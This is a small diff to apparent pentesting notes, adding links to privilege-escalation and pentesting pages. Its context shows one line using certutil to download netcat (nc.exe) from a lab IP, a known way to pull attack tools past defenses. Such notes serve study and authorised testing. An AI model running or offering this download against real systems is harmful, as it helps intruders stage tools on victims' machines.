@@ -67,3 +67,8 @@ A defacto to `wget`. The Antimalware Scan Interface (AMSI) detects this as malic
 ```bash
 cerutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
 ```
+
+
+## Related
+- [Privilege Escalation Notes](notes/hacking/priv-escalation-notes.md)
+- [Pentesting Notes & Commands](notes/hacking/pentesting-notes-commands.md)
